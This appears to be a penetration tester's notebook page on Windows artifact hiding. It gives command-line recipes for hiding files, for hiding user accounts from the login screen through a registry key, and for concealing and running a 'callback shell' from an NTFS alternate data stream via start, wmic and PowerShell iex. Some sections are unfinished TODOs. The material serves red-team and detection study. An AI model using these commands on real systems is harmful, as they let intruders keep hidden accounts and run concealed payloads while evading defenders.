# Hide Artifacts

## 01 - Manual

### 1.1 - Hiding Files and Directories

#### 1.1.1 - Command Prompt

`C:\> attrib +h +s +r <file_or_directory>`

### 1.2 - Hiding Users

#### 1.2.1 - Basic Commands

##### 1.2.1.1 - Command Prompt

- **Note:** This will take effect after restart

`C:\> net user <username> /active:no`

#### 1.2.2 - Registry

^32d5ef

##### 1.2.2.1 - Command Prompt

- Makes the username at the login screen prompt not visible

`C:\> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v <username> /t REG_DWORD /d 0 /f`

##### 1.2.2.2 - Regshell

TODO: Translate the command from above

`$ regshell`

### 1.3 - Hiding File Systems

#### 1.3.1 - Command Prompt

TODO: Fill this information

### 1.4 - Alternate Data Streams

#### 1.4.1 - Command Prompt

##### 1.4.1.1 - Basics

- **Hide the file**

`C:\> type shell.exe > file.txt:shell.exe`

- **Execute it**

`C:\> start file.txt:shell.exe`

##### 1.4.1.2 - WMIC

- **Execute Callback Shell via ADS**

`C:\> wmic process create "c:\path\to\file.txt:shell.exe"`

#### 1.4.2 - Powershell

##### 1.4.2.1 - Basics

- **Hide the file**

`PS C:\> Set-Content file.txt -Stream script.ps1 -Value shell.ps1`

- **Execute Callback Shell via ADS**

`PS C:\> Get-Content file.txt -Stream script.ps1 | iex`

## 02 - Impacket

### 2.1 - Hiding Users

#### 2.1.1 - Registry

TODO: Translate the command from above -> [[Hide Artifacts#^32d5ef]]

`$ reg.py`

## References

- [Defense Evasion Alternate Data Streams](https://www.hackingarticles.in/defense-evasion-alternate-data-streams/)

- [Alternate Data Streams ADS](https://infosecwriteups.com/alternate-data-streams-ads-54b144a831f1)

- [LOLBAS Project](https://lolbas-project.github.io)

- [Putting Data in Alternate Data Streams and How to Execute it](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)

- [CqureAcademy Alternate Data Streams](https://cqureacademy.com/blog/alternate-data-streams)

- [ThreatSpike Alternate Data Streams](https://www.threatspike.com/blogs/alternate-data-streams)